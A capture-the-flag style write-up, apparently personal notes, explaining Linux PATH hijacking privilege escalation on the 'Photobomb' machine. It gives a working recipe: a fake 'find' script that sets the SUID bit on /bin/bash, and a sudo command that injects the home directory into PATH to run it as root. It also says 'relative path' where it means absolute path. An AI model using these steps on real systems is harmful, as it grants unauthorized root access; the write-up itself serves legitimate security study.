---
description: >-
  Linux PATH Hijacking 
title: Linux PATH Hijacking              # Add title here
date: 2023-02-04 08:00:00 -0600                           # Change the date to match completion date
categories: [04 Privilege Escalation, Linux - PATH Hijacking]                     # Change Templates to Writeup
tags: [path hijacking, linux privesc]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---
In order to exploit a PATH Hijacking we need to identify two things:
- 1) That the script can be executed on another user's context
- 2) There is a missing relative path on a command or on a library

## BASH
Let's analyze the following code:
```bash
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```
As we can see the "find" command is executed without relative path (such as /bin/cat or /usr/bin/truncate) so this gives us an entry point of a privesc.
In order to hijack a PATH environment we need to first craft a script called as the name of the vulnerable variable, in this case "find":

```bash
# Script that will give special permission to the bash binary to run as root without password.
wizard@photobomb:~$ cat find
#!/bin/bash
chmod 4755 /bin/bash
```
Then we need to hijack the environment "PATH" variable with the folder where this new crafted "find" script is located:
```bash
# Actual PATH environment variable:
wizard@photobomb:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
# PATH that we need to inject on such $PATH variable:
wizard@photobomb:~$ echo $PWD
/home/wizard
```
The order where a script looks for a non-relative path command/library is from left to right on the $PATH variable, first place that will lookup is the /home/wizard path, to do so we can execute the following commands to add the PATH environment:
```bash
# Command to add /home/wizard to the PATH
wizard@photobomb:~$ sudo PATH=$PWD:$PATH /opt/cleanup.sh 
wizard@photobomb:~$ ls -al /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

It is of upmost importance to give execution permissions to the script, specially if it's being executed automatically:
```bash
wizard@photobomb:~$ chmod +x find
```

Examples:
[[Photobomb#^2939e0]]